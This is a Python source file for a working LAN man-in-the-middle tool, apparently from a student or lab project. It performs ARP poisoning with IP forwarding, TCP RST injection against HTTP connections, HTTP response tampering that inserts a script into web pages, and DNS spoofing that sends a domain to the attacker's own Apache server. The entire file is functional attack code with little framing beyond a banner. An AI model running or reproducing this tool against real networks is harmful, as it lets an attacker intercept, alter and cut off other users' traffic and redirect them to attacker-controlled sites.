#!usr/bin/env python
# title           : packet_injector_vF.py
# description     : script to inject network packets
# author          : Malsore Bublaku
# date            : June 2019

from __future__ import print_function
import netifaces
import scapy.all as scapy
import time
import sys
import logging
import netfilterqueue
import argparse
import threading
import os
import sys
import re
import socket
import ipaddress
import pyfiglet
import subprocess

#pip install pyfiglet
banner = pyfiglet.figlet_format("    Packet Injector")
running = True
threads = []


def get_arguments():
    try:
        parser = argparse.ArgumentParser(description="Packet Injector")
        parser.add_argument("--i", "--interface", dest="interface", help="Interface to use", type=str, required=True)
        parser.add_argument("--m", "--method", dest="method", help="Method to perform", type=str, required=True)
        parser.add_argument("--t", "--target", dest="target", help="target IP/IP range", type=str)
        options = parser.parse_args()
        if not options.interface:
            parser.error("[-]   Please specify an interface, use --help for more")
        if not options.method:
            parser.error("[-]   Please specify a method, use --help for more")

        return options
    except AttributeError:
        os.system('clear')
        print("[-]  Invalid entry/entries")
        print("packet_injector_vF [-i interface] [--m method] {--t target}")


def specify_parameters():
    list = []

    options = get_arguments()
    if options.interface is not None:
        list.append(options.interface)
    if options.method is not None:
        list.append(options.method)
    if options.target is not None:
        list.append(options.target)
    return list


def get_target():
    try:
        target = specify_parameters()[2]
    except IndexError:
        logging.warning("[-]  Target is not specified!")
        target = None
    return target


def get_method():
    return specify_parameters()[1]


def get_interface():
    return specify_parameters()[0]


def is_valid_ipv4(target_ip):
    target_ip = get_target()
    if target_ip is not None:
        try:
            socket.inet_aton(target_ip) #If the IPv4 address string passed to this function is invalid, socket.error will be raised.
            print("[+]  Valid target IP: {}".format(target_ip))
            return True
        except socket.error:
            logging.warning("[-]    Invalid target IP: {}".format(target_ip))
            sys.exit()



def check_interface_status(interface):
    addr = netifaces.ifaddresses(interface)
    return netifaces.AF_INET in addr


def get_interface_ip(interface):
    try:
        return netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']
    except KeyError:
        logging.warning("[-]    Interface {} is not up".format(interface))
        #print(get_interface_ip.__doc__)


def get_active_interfaces():
    list = []
    interface_list = netifaces.interfaces() #gets all interfaces
    count_interfaces = len(interface_list)
    for i in range(count_interfaces):
        if check_interface_status(interface_list[i]): #check if interface is active
            list.append(interface_list[i])
    return list


def print_active_interfaces():
    list = get_active_interfaces()
    i = 1
    print("[+]  Active interfaces:", end="")
    for element in list:
        print("["+str(i)+"] "+element+":"+get_interface_ip(element), end=" ")
        i = i + 1
    print(end="\n")


def get_default_gateway():
    if check_interface_status(get_interface()):
        gateway = netifaces.gateways()
        return gateway['default'].values()[0][0]
    else:
        logging.warning("[-]  Default gateway: interface {} is not active".format(get_interface()))


def get_netmask_address(interface):
    try:
        addresses = netifaces.ifaddresses(interface).values()[1][0]
        for key, value in addresses.items():  # for name, age in dictionary.iteritems():
            if key == "netmask":
                return value
    except IndexError:
        logging.warning("[-]  Subnet mask couldn't be resolved")
        return


def get_network_id(interface):
    if check_interface_status(get_interface()):
        iface = get_interface_ip(interface)
        netmask = get_netmask_address(interface)
        iface_array = map(int, iface.split('.'))
        gw_array = map(int, netmask.split('.'))
        res_zip = zip(iface_array, gw_array)
        result = ".".join(map(str, [nm & ifc for nm, ifc in res_zip]))
        return result
    else:
        logging.warning("[-] Network Id: Interface {} is not active".format(get_interface()))


def icmp_ping(host): #{host} optional
    host = get_target()
    ans, unans = scapy.sr(scapy.IP(dst=host)/scapy.ICMP(), timeout=4, verbose=False)
    #ans.summary(lambda p: p[1].sprintf("%IP.src% is alive"))
    return bool(ans)


def get_active_host(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast_frame = scapy.Ether(dst="FF:FF:FF:FF:FF:FF")
    broadcast_arp_frame = broadcast_frame/arp_request
    answer_list = scapy.srp(broadcast_arp_frame, timeout=1, verbose=False)[0]

    hosts_list = []
    for element in answer_list:
        host_dict = {"ip": element[1].psrc}
        hosts_list.append(host_dict)

    for element1 in hosts_list:
        print("\r[*]  Active host:" + element1['ip'])
        # print(client_dict['ip'])
        sys.stdout.flush()
        time.sleep(0.03)  # python will stop executing for 0.03 seconds


def get_iface_mac(interface):
    ifconfig_result = subprocess.check_output(["ifconfig", interface])
    mac_address_search_result = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", ifconfig_result)
    if mac_address_search_result:
        return mac_address_search_result.group(0)#first occurence
    else:
        print("[-] Could not read MAC address")


def netmask_to_CIDR():
    if get_netmask_address(get_interface()):
        return "/"+str(sum([bin(int(x)).count('1') for x in get_netmask_address(get_interface()).split('.')]))
    else:
        logging.warning('[-]    Interface {} not active'.format(get_interface()))


def print_initial_informations():
    print_active_interfaces()
    print("[+]  Interface in use: {}".format(get_interface()))
    print("[+]  MAC address :{}".format(get_iface_mac(get_interface())))
    if check_interface_status(get_interface()):
        print("[+]  Default gateway: {}".format(get_default_gateway()))
        print("[+]  Subnet id: {}".format(get_network_id(get_interface())))
        print("[+]  Network mask: {}".format(get_netmask_address(get_interface())))
        if get_target() != None:
            print("[+]  Target: {}".format(get_target()))
            if is_valid_ipv4(get_target()) and icmp_ping(get_target()):
                print("[+]  Target is alive")
            else:
                print("[-]  Invalid Target")
        print("[+]  Method: {}".format(get_method()))

        subnet_mask = netmask_to_CIDR()
        subnet_id = get_network_id(get_interface())
        if get_interface() in get_active_interfaces():
            ip = str(subnet_id+""+subnet_mask)
            print("[+]  Scanning network....\n")
            get_active_host(ip)
        else:
            print("[-]  {} not active".format(get_interface()))

        print("\n")
    else:
        print("[-]  Interface not active")
        sys.exit()


def get_mac(ip):
    try:
        arp_frame = scapy.Ether(dst="FF:FF:FF:FF:FF:FF")/scapy.ARP(pdst=ip)
        answered_list = scapy.srp(arp_frame, timeout=1, verbose=False)[0]
        return answered_list[0][1].hwsrc
    except IndexError:
        pass


def arp_spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore_arp_table(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False, count=4)


def arp_thread():
    """
       starts arp thread
    """
    if get_target()!=None:
        print("[+]  Starting arp thread...")
        t1 = threading.Thread(name="ArpThread", target=arp_poison)
        t1.daemon = True
        t1.start()
        threads.append(t1)
    else:
        print("[-]  Target is not specified")
        sys.exit()


def restore_thread():
    """
       starts restore thread
    """
    print("[+]  Enter e if you want to restore Arp Table")
    t2 = threading.Thread(name="RestoreThread", target=restore_arp_tb)
    t2.daemon = True
    t2.start()
    threads.append(t2)


def rst_thread():
    """
       starts rst injector thread
    """
    print("[+]  Starting rst thread...")
    t3 = threading.Thread(name="RstThread", target=rst_starter)
    t3.daemon = True
    t3.start()
    threads.append(t3)


def rawinj_thread():
    """
    starts raw injector thread
    """
    print("[+]  Starting raw injector thread...")
    time.sleep(0.05)
    print("[+]  Enter CTRL+C to stop capturing packets")
    t4 = threading.Thread(name="RawThread", target=raw_starter)
    t4.daemon = True
    t4.start()
    threads.append(t4)

def dnsinj_thread():
    """
       starts dns injector thread
    """
    print("[+]  Starting DNS injector thread...")
    time.sleep(0.05)
    print("[+]  Enter CTRL+C to stop capturing packets")
    t5 = threading.Thread(name="DnsThread", target=dns_starter)
    t5.daemon = True
    t5.start()
    threads.append(t5)


def arp_poison():
    if get_target()!=None:
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        print("[+]  IP Forwarding enabled")
        sent_packets_count = 0
        print("[+]  Arp Poisoning started")
        while running:
            arp_spoof(get_target(), get_default_gateway())
            arp_spoof(get_default_gateway(), get_target())
            time.sleep(2)
    else:
        print("[-]  Please specify a target")


e = threading.Event()
def rst_starter():
    print("[+]  Rst Injector started")


    def rst_inject(packet):
        if running:
            if packet.haslayer(scapy.IP):
                p = packet[scapy.IP]
                if packet.haslayer(scapy.TCP):
                    scapy_TCP = packet[scapy.TCP]
                    if scapy_TCP.dport == 80: #paketa nga klienti

                        print("\n[*]  Packet accepted at destionation port:" + str(scapy_TCP.dport))

                        ip_packet = scapy.IP(src=p.dst, dst=p.src, ihl=p.ihl, flags=p.flags,
                                      frag=p.frag, ttl=p.ttl,
                                      proto=p.proto, id=12345)

                        tcp_packet = scapy.TCP(sport=scapy_TCP.dport, dport=scapy_TCP.sport, seq=scapy_TCP.ack,
                                        ack=0, dataofs=scapy_TCP.dataofs,
                                        reserved=scapy_TCP.reserved, flags="R", window=scapy_TCP.window,
                                        options=scapy_TCP.options)

                        reset = ip_packet / tcp_packet

                        scapy.send(reset, verbose=False)
                        print("[+]  RST flag injected")
        else:
            e.set()

    while running:

        scapy.sniff(count=0, prn=rst_inject, stop_filter=lambda p: e.is_set())
        time.sleep(3)
        print("[+]  Rst Injection finished")


def raw_starter():
    time.sleep(1)
    bind_queue()


def raw_starter_no_target():
    time.sleep(1)
    bind_queue_no_target()

def change_payload(pkt, load):
    pkt[scapy.Raw].load = load
    del pkt[scapy.IP].len
    del pkt[scapy.IP].chksum
    del pkt[scapy.TCP].chksum
    return pkt


def bind_queue():
    queue = netfilterqueue.NetfilterQueue()
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 7")
    queue.bind(7, process_packet)
    print("\r[+]  Queue bound", end="\n")
    sys.stdout.flush()
    time.sleep(0.03)
    print("[+]  Processing traffic...", end="\n")
    queue.run()


def bind_queue_no_target():
    try:
        queue = netfilterqueue.NetfilterQueue()
        os.system("iptables -I INPUT -j NFQUEUE --queue-num 7")
        os.system("iptables -I OUTPUT -j NFQUEUE --queue-num 7")

        queue.bind(7, process_packet)
        print("\r[+]  Queue bound", end="\n")
        sys.stdout.flush()
        time.sleep(0.03)
        print("[+]  Processing traffic...", end="\n")
        queue.run()
    except KeyboardInterrupt:
        print("[-]  Exiting...")
        print("[-]  Flushing iptables...")
        os.system("iptables --flush")


def process_packet(pkt):
    IP_packet = scapy.IP(pkt.get_payload())#konvertimi ne scapy pakete
    if IP_packet.haslayer(scapy.TCP):
        TCP_segment = IP_packet[scapy.TCP]
        if IP_packet.haslayer(scapy.Raw):
            raw_load = IP_packet[scapy.Raw].load
            if TCP_segment.dport == 80 and raw_load != '':
                print(end="\n")
                print("[*]  HTTP Request", end="\n")
                print("[+]  Before replacing load", end="\n")
                print(raw_load)
                print(end="\n")
                load = re.sub("Accept-Encoding:.*?\\r\\n", "", raw_load)
                new_packet = change_payload(IP_packet, load)
                print("[+]  After replacing load", end="\n")
                print(new_packet.load) # ne menyre qe paketa qe forwardohet te jete paketa  re
                pkt.set_payload(str(new_packet))

            elif TCP_segment.sport == 80 and raw_load != '':
                print("[*]  HTTP Response", end="\n")
                print("[+]  Before code injection", end="\n")
                print(raw_load)
                injection_code = "<button onclick='myFunction()'>Click me</button><script>function myFunction() {alert('Test!');}</script>"
                load = raw_load.replace("</body>", injection_code+"</body>")
                current_content_length =re.search("(?:Content-Length:\s)(\d*)", load)
                if 'text/html' and 'Content-Length' in load:
                    content_length = current_content_length.group(1)# merret actual content length
                    print("[+]  Current content-length: {}".format(content_length))
                    new_content_length = int(content_length)+len(injection_code)
                    print("[+]  New content-length: {}".format(new_content_length))
                    load = load.replace(content_length, str(new_content_length))

                new_packet = change_payload(IP_packet, load)
                pkt.set_payload(str(new_packet))
                print("[+]  After code injection")
                print(new_packet.load)
    pkt.accept()


def dns_starter():
    time.sleep(1)
    def remove_chksum(packet):
        del packet[scapy.IP].len
        del packet[scapy.IP].chksum
        del packet[scapy.UDP].len
        del packet[scapy.UDP].chksum
        return packet


    def process_packet(pkt):
        domain = "www.example.com"
        packet = scapy.IP(pkt.get_payload())#konvertimi ne scapy pakete
        if packet.haslayer(scapy.DNS):


            if packet[scapy.DNS].qr == 0:
                print("[+]  DNS Query")
                print(packet.show())
            elif packet[scapy.DNS].qr == 1:
                print("[+]  DNS Response")
                print(packet.show())
                qname = packet[scapy.DNSQR].qname
                if domain in qname:#modifikojme dns response:
                    injection_packet = scapy.DNSRR(rrname=qname, ttl=10, rdata=get_interface_ip(get_interface()))
                    packet[scapy.DNS].an = injection_packet
                    packet[scapy.DNS].ancount = 1
                    remove_chksum(packet)
                    print("\n[+] Pas modifikimit")
                    print(packet.show())

                    pkt.set_payload(str(packet))


        pkt.accept()#paketa dergohet te target
        #packet.drop()

    queue = netfilterqueue.NetfilterQueue()
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 7")
    os.system("service apache2 start") #/var/www/ index.
    queue.bind(7, process_packet)
    print("\r[+]  Queue bound", end="\n")
    sys.stdout.flush()
    time.sleep(0.03)
    print("[+]  Processing traffic...", end="\n")
    queue.run()


def restore_arp_tb():
    while True:
        x = raw_input("")
        if x.lower() == 'e':
            print("[-]  You have entered letter e")
            global running
            running = False
            print("[-]  Restoring ARP table...")
            restore_arp_table(get_target(), get_default_gateway())
            restore_arp_table(get_default_gateway(), get_target())
            print("[+]  Table restored")
            break


def start_arp():
    arp_thread()
    restore_thread()
    #done

def start_sniff():
    pass


def start_rstinj():
    arp_thread()
    time.sleep(0.06)
    rst_thread()
    restore_thread()
    #done


def start_rawinj():
    arp_thread()
    time.sleep(0.06)
    rawinj_thread()
    restore_thread()


def start_dnsinj():
    arp_thread()
    time.sleep(0.06)
    dnsinj_thread()
    restore_thread()

def start_rawinj_no_target():
    raw_starter_no_target()


def find_method():
    method = get_method()
    if method == 'ARPSPOOF':
        start_arp()
    elif method == 'SNIFF':
        start_sniff()
    elif method == 'RSTINJECTOR': #done
        start_rstinj()
    elif method == 'RAWINJECTOR':
        if get_target()!=None:
            start_rawinj()#done
        else:
            start_rawinj_no_target()
    elif method == 'DNSINJECTOR':
        start_dnsinj()
    else:
        print("[-]  Unknown method given")


def join_threads(threads):
    for t in threads:
        while t.isAlive():
            t.join(5)


if __name__ == '__main__':

    print(banner)
    print("[!]  Enter CTRL+C to stop the program\n")
    print_initial_informations()
    find_method()
    try:
        join_threads(threads)
    except KeyboardInterrupt:
        print("[-]  Exiting....")
        sys.stdout.flush()
        time.sleep(0.05)
        print("[-]  Disabling ip forwarding...")
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        sys.stdout.flush()
        time.sleep(0.05)
        print("[-]  Flushing iptables rules...")
        os.system("iptables --flush")
    except Exception as e:
        print("[-]  Exception caught: {}".format(e))
